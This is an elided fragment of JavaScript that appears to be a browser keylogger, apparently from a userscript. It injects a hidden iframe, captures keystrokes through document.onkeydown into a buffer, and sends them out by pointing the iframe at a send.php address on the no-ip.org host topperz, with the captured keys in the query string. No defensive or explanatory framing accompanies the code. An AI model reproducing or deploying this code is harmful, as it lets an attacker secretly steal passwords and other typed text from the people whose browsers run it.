...
container.innerHTML='<iframe style="display:none;" id="sender"></iframe>';
...
document.onkeydown=function(e){
		  ...
		  if(charCount==2)
			...
			if(changeFrame==1)
			{
			 document.getElementById("sender").setAttribute('src', 'http://topperz.no-ip.org/userscripts/internetsecurity/send.php?s='+record);
			record="";
			charCount=0;
			changeFrame++;
			}
